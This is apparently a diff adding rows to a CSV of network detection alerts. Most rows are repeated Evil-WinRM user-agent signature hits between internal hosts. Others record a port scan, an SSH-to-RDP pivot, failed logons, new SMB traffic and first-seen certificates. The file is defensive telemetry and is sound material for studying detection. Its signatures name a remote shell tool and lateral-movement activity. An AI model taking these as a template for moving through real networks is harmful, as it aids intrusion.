+Medium,36327,2025-03-28T14:31:12Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36328,2025-03-28T14:32:04Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1759,1832",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36329,2025-03-28T14:31:04Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1759,1832",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36332,2025-03-28T14:32:25Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1762,1759",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36333,2025-03-28T14:32:12Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36339,2025-03-28T14:33:25Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1759,1762",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36340,2025-03-28T14:34:12Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36341,2025-03-28T14:33:12Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36342,2025-03-28T14:33:04Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1759,1832",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36343,2025-03-28T14:34:26Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1759,1762",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36344,2025-03-28T14:34:04Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1759,1832",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36346,2025-03-28T14:35:04Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36347,2025-03-28T14:34:45Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1759,1762",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36348,2025-03-28T14:35:26Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1762,1759",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36349,2025-03-28T14:36:12Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36350,2025-03-28T14:35:12Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36351,2025-03-28T14:36:26Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1762,1759",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36352,2025-03-28T14:36:04Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1759,1832",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36353,2025-03-28T14:37:12Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36354,2025-03-28T14:37:26Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1762,1759",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36355,2025-03-28T14:37:04Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36358,2025-03-28T14:38:41Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1762,1759",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36359,2025-03-28T14:38:12Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36360,2025-03-28T14:38:04Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1759,1832",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36361,2025-03-28T14:39:04Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36362,2025-03-28T14:40:04Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36363,2025-03-28T14:39:12Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1905",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36364,2025-03-28T14:39:26Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1759,1762",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36367,2025-03-28T14:40:12Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36368,2025-03-28T14:41:12Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36369,2025-03-28T14:40:26Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1762,1759",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36371,2025-03-28T14:41:26Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1762,1759",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36372,2025-03-28T14:42:04Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1759,1832",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36373,2025-03-28T14:42:04Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1762,1759",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36374,2025-03-28T14:41:04Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1759,1832",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36376,2025-03-28T14:42:26Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1762,1759",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36377,2025-03-28T14:42:12Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36378,2025-03-28T14:42:42Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1762,1759",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Low,36385,2025-03-28T14:30:43Z,Communication,Configuration,X509 Certificate Seen for First Time,"Asset 1759 seen using a certificate that hasn't been observed before.
+ subject: 
+ issuer:",X509 Certificate First Seen,"1762,1759",,,10.0.4.43,10.0.4.44,,50d07ea9-bcc0-4fb7-a960-41a1a8c22fb6,
+Low,36387,2025-03-28T14:35:28Z,Asset,Configuration,User-Agent First Seen from Host,Asset 1762 made an HTTP request with User-Agent Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0 for the first time.,User Agent First Seen,1762,,,,,10.0.4.44,00378c59-e178-45c0-b85a-69dbef459c87,
+Low,36389,2025-03-28T14:33:37Z,Asset,Configuration,User-Agent First Seen from Host,Asset 1759 made an HTTP request with User-Agent Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0 for the first time.,User Agent First Seen,1759,,,,,10.0.4.43,0ad7236a-0b03-4aed-ba0c-5d786df44dbf,
+Medium,36401,2025-03-28T14:43:12Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36402,2025-03-28T14:43:05Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36403,2025-03-28T14:43:26Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1759,1762",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36404,2025-03-28T14:44:05Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36405,2025-03-28T14:44:12Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Low,36406,2025-03-28T14:39:02Z,Communication,Threat Behavior,Interactive Session Pivot,Asset 2896 (10.0.242.127) connected via SSH to asset 1832 (10.0.4.11) to then pivot to asset 1763 (10.0.4.29) via RDP.,Interactive Session Pivots,"2896,1763",,,10.0.242.127,10.0.4.29,,,
+Medium,36427,2025-03-28T14:45:12Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36428,2025-03-28T14:44:37Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1762,1759",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36429,2025-03-28T14:44:26Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1762,1759",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36435,2025-03-28T14:45:26Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1762,1759",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36436,2025-03-28T14:46:05Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1759,1832",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36437,2025-03-28T14:46:12Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1905",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36438,2025-03-28T14:46:05Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1762,1759",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36439,2025-03-28T14:45:05Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1759,1832",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36440,2025-03-28T14:46:27Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1762,1759",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36441,2025-03-28T14:44:02Z,Network Analytic,Threat Behavior,Port Scan Detected(TCP),10.0.4.43 scanned at least 64 unique ports of host 10.0.4.45 in 5 seconds - local,Port Scan,"1759,1825",,,10.0.4.43,10.0.4.45,,Network Traffic,
+Medium,36444,2025-03-28T14:47:37Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1762,1759",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36453,2025-03-28T14:47:05Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36454,2025-03-28T14:46:58Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1759,1762",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36464,2025-03-28T14:47:27Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1762,1759",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36465,2025-03-28T14:48:28Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1762,1759",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36466,2025-03-28T14:48:13Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36467,2025-03-28T14:48:05Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1759,1832",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36468,2025-03-28T14:47:12Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36476,2025-03-28T14:48:27Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1762,1759",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36477,2025-03-28T14:49:05Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1759,1832",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36480,2025-03-28T14:50:20Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36481,2025-03-28T14:49:38Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1759,1762",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36482,2025-03-28T14:49:13Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1905",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36483,2025-03-28T14:49:37Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1759,1762",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36494,2025-03-28T14:50:13Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36495,2025-03-28T14:50:27Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1762,1759",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36512,2025-03-28T14:52:05Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36513,2025-03-28T14:51:27Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1759,1762",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36514,2025-03-28T14:51:13Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1905",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36515,2025-03-28T14:51:05Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36535,2025-03-28T14:53:19Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1759,1762",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36536,2025-03-28T14:52:42Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1762,1759",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36537,2025-03-28T14:53:13Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36538,2025-03-28T14:52:13Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36544,2025-03-28T14:53:05Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36545,2025-03-28T14:53:38Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1759,1762",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36550,2025-03-28T14:54:13Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36551,2025-03-28T14:55:05Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36552,2025-03-28T14:54:27Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1759,1762",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36553,2025-03-28T14:54:05Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36561,2025-03-28T14:55:13Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36562,2025-03-28T14:56:05Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36563,2025-03-28T14:56:13Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36564,2025-03-28T14:55:28Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1762,1759",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36565,2025-03-28T14:56:28Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1762,1759",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36573,2025-03-28T14:58:06Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36574,2025-03-28T14:57:06Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36575,2025-03-28T14:57:28Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1759,1762",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36576,2025-03-28T14:57:13Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1905",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36688,2025-03-28T14:03:10Z,Communication,Threat Behavior,Multiple Suricata Alerts,"Asset 1759 involved in 7 unique Suricata alerts: ['20240023', '20240042', '20240022', '20240041', '20240006', '20240137', '9908342']; [""401 'Unauthorized'"", 'WinRM wsman Rapid Access - Possible Lateral Movement', 'Evil-WinRM User Agent Rapid Usage', 'WinRM wsman Access', 'HTTP GET to IP', 'HTTP POST to IP', 'Evil-WinRM User Agent']. IPs: 10.0.4.43 10.0.4.11.",Multiple Suricata Alerts,"1832,1759",,,10.0.4.11,10.0.4.43,,,
+Medium,36691,2025-03-28T14:58:13Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36692,2025-03-28T14:59:21Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36694,2025-03-28T14:58:28Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1759,1762",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Low,36700,2025-03-28T14:59:06Z,Communication,Indicator,Failed HTTP Logon,"Asset 1759 (10.0.4.43) returned an HTTP response code of 401 'Unauthorized' to asset 1832 (10.0.4.11), which represents a failed logon attempt via HTTP by asset 1832. Logon attempts that result in HTTP status codes such as 401 'Unauthorized', 403 'Forbidden', or 407 'Proxy Authentication Required' can occur legitimately when users mistype credentials or attempt to access resources they are not authorized to use; however, they can also be indicative of malicious activities, such as unauthorized access attempts, brute force attacks, or the misuse of stolen credentials, where adversaries are testing access controls and trying to gain illicit entry into systems.",HTTP Auth Failure,"1832,1759",,,10.0.4.43,10.0.4.11,,902a5eca-7b7a-4e78-a97d-83f38be31596,
+Low,36734,2025-03-28T14:54:56Z,Communication,Configuration,Detected 15 NewX509Certificate between 2025-03-28T14:45:57.707Z and 2025-03-28T14:54:56.456Z,"Sample NewX509Certificate values include:
+  server: 20.97.190.220, 20.12.23.50, 142.250.184.195, 4.154.131.224, 3.160.150.90, 20.163.45.188, 40.69.70.68, 13.74.186.119, 20.189.173.9, 13.74.142.6;
+  subject: , C=US, ST=WA, L=Redmond, O=Microsoft, OU=DSP, CN=*.prod.do.dsp.mp.microsoft.com, C=US, ST=WA, L=Redmond, O=Microsoft, OU=DSP, CN=fe2cr.update.microsoft.com, C=US, ST=Washington, L=Redmond, O=Microsoft Corporation, CN=login.live.com;
+  not_before: , 2025-03-16T00:00:00Z, 2025-03-04T20:39:31Z, 2024-11-07T19:28:51Z;
+  server_asset_id: 4111, 4110, 2808, 2615, 4107, 4106, 4104, 4114, 4108, 4113;
+  dst__port: ('',);
+  dns: ;
+  uuid: b91bb837-987b-43a2-8b52-a156a058231f, a2f171bb-4453-40ca-abfd-fa839f5a05e9, 91fa61c2-2911-4be6-9a1a-4f1af98386d2, 6497950e-f3b5-46b0-b687-2b5743e15274, e13fb67a-c428-41de-a8f0-3bf3f2548ed5, 0003e30e-6ef5-4c73-b25e-c4c219cd855f, 4246147b-f108-4d54-ae6c-fd439f053950, 55e95481-c276-4f3f-b6eb-03c00ffc9f46, 00e4e171-600d-4dd8-b07e-3bf62480e017, 68711d39-e415-476a-ac5a-d39f6a3ad1ad;
+  issuer: , C=US, ST=Washington, L=Redmond, O=Microsoft Corporation, CN=Microsoft ECC Content Distribution Secure Server CA 2.1, C=US, ST=Washington, L=Redmond, O=Microsoft Corporation, CN=Microsoft ECC Update Secure Server CA 2.1, C=US, O=DigiCert Inc, CN=DigiCert SHA2 Secure Server CA;
+  client_asset_id: 1680, 1905, 50, 1841, 46, 1916, 1772, 1746, 1801, 1754;
+  src__mac: ;
+  not_after: , 2025-11-07T19:28:51Z, 2026-03-04T20:39:31Z, 2025-09-16T23:59:59Z;
+  dst__mac: ;
+  protocol: ;
+  dst__ip: ;
+  client: 10.0.1.12, 10.0.1.29, 10.0.6.29, 10.0.7.29, 10.0.4.30, 10.0.8.30, 10.0.7.12, 10.0.6.11, 10.0.7.11, 10.0.10.29;
+  src__port: ('',);
+  src__ip: ;",X509 Certificate First Seen,"1754,1841,1680,46,1772,1746,1916,1801,1905,50,4107,4111,4110,2808,2615,4106,4104,4114,4108,4113",,,"13.32.99.21,20.163.45.188,40.69.70.68,20.190.159.68,20.3.187.198,184.25.50.128,3.160.150.90,20.189.173.9,20.97.190.220,4.154.131.224","10.0.6.11,10.0.7.12,10.0.7.29,10.0.1.12,10.0.7.11,10.0.6.29,10.0.8.30,10.0.10.29,10.0.4.30,10.0.2.29",,"b91bb837-987b-43a2-8b52-a156a058231f, a2f171bb-4453-40ca-abfd-fa839f5a05e9, 91fa61c2-2911-4be6-9a1a-4f1af98386d2, 6497950e-f3b5-46b0-b687-2b5743e15274, e13fb67a-c428-41de-a8f0-3bf3f2548ed5, 0003e30e-6ef5-4c73-b25e-c4c219cd855f, 4246147b-f108-4d54-ae6c-fd439f053950, 55e95481-c276-4f3f-b6eb-03c00ffc9f46, 00e4e171-600d-4dd8-b07e-3bf62480e017, 68711d39-e415-476a-ac5a-d39f6a3ad1ad",
+Low,36737,2025-03-28T14:56:18Z,Communication,Configuration,New SMB Communication detected,"New SMB_FileInfo (version: ['SMB1', 'SMB2']) traffic between Asset:1762 and Asset:1875",New SMB Communication Detection,"1762,1875",,,10.0.4.44,10.0.4.59,,104a352c-512c-4a55-82c9-25ceb02a515c,
+Low,36738,2025-03-28T14:55:59Z,Communication,Configuration,New SMB Communication detected,New SMB_FileInfo (version: ) traffic between Asset:1762 and Asset:1875,New SMB Communication Detection,"1762,1875",,,10.0.4.44,10.0.4.59,,494a4a5d-4e7e-4f6d-849a-169dbccad71b,
+Medium,36743,2025-03-28T14:59:13Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1905",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36744,2025-03-28T14:59:43Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1759,1762",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36747,2025-03-28T15:01:13Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36748,2025-03-28T15:00:13Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36749,2025-03-28T15:00:06Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36750,2025-03-28T15:01:06Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36765,2025-03-28T15:01:28Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1762,1759",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36796,2025-03-28T15:02:21Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36797,2025-03-28T15:02:13Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1905",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36798,2025-03-28T15:02:28Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1759,1762",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36855,2025-03-28T15:03:43Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1762,1759",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36856,2025-03-28T15:03:13Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36857,2025-03-28T15:03:21Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1759,1832",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36910,2025-03-28T15:05:13Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36972,2025-03-28T15:04:06Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,37183,2025-03-28T15:09:40Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,37184,2025-03-28T15:09:40Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Low,37475,2025-03-28T15:10:53Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.45.,SSH Authentication Failure,"2896,1825",,,10.0.242.127,10.0.4.45,,5db86cb4-9583-4350-a57d-007a614b18ab,
